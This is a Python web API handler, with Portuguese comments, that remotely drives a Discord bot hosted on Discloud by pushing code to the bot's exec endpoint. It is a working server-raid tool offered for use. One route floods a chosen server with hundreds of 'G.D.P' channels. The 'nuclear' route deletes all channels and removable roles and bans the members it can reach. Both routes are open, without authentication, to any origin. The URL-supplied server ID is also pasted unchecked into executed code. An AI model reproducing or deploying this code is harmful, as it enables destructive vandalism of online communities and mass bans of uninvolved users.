from http.server import BaseHTTPRequestHandler
import json
import os
import requests
from urllib.parse import urlparse
import time
import asyncio

# ==================== CONFIGURAÇÕES ====================
DISCLOUD_TOKEN = os.getenv('DISCLOUD_TOKEN', '')
BOT_ID = os.getenv('BOT_ID', '1386082293533249546')
API_BASE_URL = "https://api.discloud.app/v2"

class handler(BaseHTTPRequestHandler):
    
    def do_GET(self):
        self.send_response(200)
        self.send_header('Content-type', 'application/json')
        self.send_header('Access-Control-Allow-Origin', '*')
        self.send_header('Access-Control-Allow-Methods', 'GET, POST, OPTIONS')
        self.send_header('Access-Control-Allow-Headers', 'Content-Type, api-token')
        self.end_headers()

        parsed = urlparse(self.path)
        path = parsed.path
        print(f"📡 Requisição: {path}")

        # ========== ROTAS ==========
        if path == '/' or path == '/api' or path == '/api/':
            result = self.rota_principal()
        elif path == '/api/test':
            result = self.rota_teste()
        elif path == '/api/verificar-token':
            result = self.verificar_token()
        elif path == '/api/status':
            result = self.status_bot()
        elif path == '/api/servidores':
            result = self.listar_servidores()
        elif path.startswith('/api/gdp/'):
            partes = path.split('/')
            if len(partes) >= 4:
                server_id = partes[3]
                quantidade = partes[4] if len(partes) >= 5 else '100'
                result = self.executar_gdp(server_id, quantidade)
            else:
                result = {"erro": "URL inválida. Use: /api/gdp/ID/QUANTIDADE"}
        elif path.startswith('/api/nuclear/'):
            partes = path.split('/')
            if len(partes) >= 4:
                server_id = partes[3]
                result = self.executar_nuclear(server_id)
            else:
                result = {"erro": "URL inválida. Use: /api/nuclear/ID"}
        else:
            result = {"erro": "Rota não encontrada", "rotas_disponiveis": [
                "/api", "/api/test", "/api/verificar-token", "/api/status", 
                "/api/servidores", "/api/gdp/ID/QUANTIDADE", "/api/nuclear/ID"
            ]}

        self.wfile.write(json.dumps(result, indent=2, ensure_ascii=False).encode('utf-8'))

    def do_OPTIONS(self):
        self.send_response(200)
        self.send_header('Access-Control-Allow-Origin', '*')
        self.send_header('Access-Control-Allow-Methods', 'GET, POST, OPTIONS')
        self.send_header('Access-Control-Allow-Headers', 'Content-Type, api-token')
        self.end_headers()

    def _fazer_requisicao(self, metodo, endpoint, dados=None):
        """Faz uma requisição para a API da Discloud."""
        headers = {'api-token': DISCLOUD_TOKEN, 'Content-Type': 'application/json'}
        url = f"{API_BASE_URL}{endpoint}"
        
        try:
            if metodo.upper() == 'GET':
                response = requests.get(url, headers=headers, timeout=10)
            elif metodo.upper() == 'POST':
                response = requests.post(url, headers=headers, json=dados, timeout=10)
            elif metodo.upper() == 'PUT':
                response = requests.put(url, headers=headers, json=dados, timeout=10)
            else:
                return {"sucesso": False, "erro": "Método não suportado"}
            
            if response.status_code in [200, 201]:
                return {"sucesso": True, "dados": response.json()}
            else:
                return {"sucesso": False, "status": response.status_code, "erro": response.text}
        except Exception as e:
            return {"sucesso": False, "erro": str(e)}

    def rota_principal(self):
        return {
            "nome": "GDP Control API",
            "versao": "7.0",
            "status": "online",
            "token_valido": bool(DISCLOUD_TOKEN),
            "endpoints": {
                "testar": "/api/test",
                "verificar_token": "/api/verificar-token",
                "status_bot": "/api/status",
                "servidores": "/api/servidores",
                "gdp": "/api/gdp/ID_DO_SERVIDOR/QUANTIDADE",
                "nuclear": "/api/nuclear/ID_DO_SERVIDOR"
            }
        }

    def rota_teste(self):
        return {"status": "online", "timestamp": time.time()}

    def verificar_token(self):
        if not DISCLOUD_TOKEN:
            return {"valido": False, "erro": "Token não configurado"}
        resultado = self._fazer_requisicao('GET', '/user')
        return {"valido": resultado['sucesso'], "dados": resultado.get('dados')}

    def status_bot(self):
        if not DISCLOUD_TOKEN:
            return {"status": "offline", "erro": "Token não configurado"}
        resultado = self._fazer_requisicao('GET', f"/app/{BOT_ID}/status")
        if resultado['sucesso']:
            return {"status": "online", "dados": resultado['dados']}
        return {"status": "offline", "erro": resultado.get('erro')}

    def listar_servidores(self):
        """Lista os servidores onde o bot está"""
        resultado = self._fazer_requisicao('GET', f"/app/{BOT_ID}")
        if resultado['sucesso']:
            dados = resultado['dados']
            return {
                "servidores": dados.get('guilds', []),
                "total": len(dados.get('guilds', []))
            }
        return {"erro": "Não foi possível listar servidores"}

    def executar_gdp(self, server_id, quantidade):
        """Executa GDP diretamente via comando no terminal"""
        
        # Converte quantidade para inteiro
        try:
            qtd = int(quantidade)
            if qtd > 500:
                qtd = 500
        except:
            qtd = 100
        
        # Comando para executar a função GDP diretamente
        comando = f"""
import asyncio
import discord

async def run():
    guild = bot.get_guild({server_id})
    if not guild:
        print('Servidor não encontrado')
        return
    
    criados = 0
    for i in range(1, {qtd} + 1):
        try:
            nome = f'G.D.P-{{i:03d}}'
            if not discord.utils.get(guild.channels, name=nome):
                await guild.create_text_channel(nome)
                criados += 1
            await asyncio.sleep(0.5)
        except:
            pass
    
    print(f'✅ {{criados}} canais criados')

asyncio.run(run())
"""
        
        resultado = self._fazer_requisicao('PUT', f"/app/{BOT_ID}/exec", dados={"cmd": comando})
        
        if resultado['sucesso']:
            return {
                "sucesso": True,
                "comando": f"GDP {qtd}",
                "servidor": server_id,
                "mensagem": f"✅ Criando {qtd} canais no servidor {server_id}",
                "status": "executando"
            }
        else:
            return {
                "erro": "Erro ao executar GDP",
                "detalhes": resultado.get('erro')
            }

    def executar_nuclear(self, server_id):
        """Executa Nuclear diretamente via comando no terminal"""
        
        comando = f"""
import asyncio

async def run():
    guild = bot.get_guild({server_id})
    if not guild:
        print('Servidor não encontrado')
        return
    
    resultados = {{'canais': 0, 'cargos': 0, 'banidos': 0}}
    
    # Deletar canais
    for channel in guild.channels:
        try:
            await channel.delete()
            resultados['canais'] += 1
            await asyncio.sleep(0.3)
        except:
            pass
    
    # Deletar cargos
    for role in guild.roles:
        if role.name != '@everyone' and not role.managed and role < guild.me.top_role:
            try:
                await role.delete()
                resultados['cargos'] += 1
                await asyncio.sleep(0.3)
            except:
                pass
    
    # Banir membros
    for member in guild.members:
        if member != guild.me and member.top_role < guild.me.top_role:
            try:
                await member.ban(reason='Nuclear via site')
                resultados['banidos'] += 1
                await asyncio.sleep(1)
            except:
                pass
    
    print(f'☢️ NUCLEAR CONCLUÍDO: {{resultados}}')

asyncio.run(run())
"""
        
        resultado = self._fazer_requisicao('PUT', f"/app/{BOT_ID}/exec", dados={"cmd": comando})
        
        if resultado['sucesso']:
            return {
                "sucesso": True,
                "comando": "NUCLEAR",
                "servidor": server_id,
                "mensagem": "☢️ LIMPEZA NUCLEAR INICIADA",
                "alerta": "Esta ação é irreversível e será executada imediatamente!"
            }
        else:
            return {
                "erro": "Erro ao executar nuclear",
                "detalhes": resultado.get('erro')
            }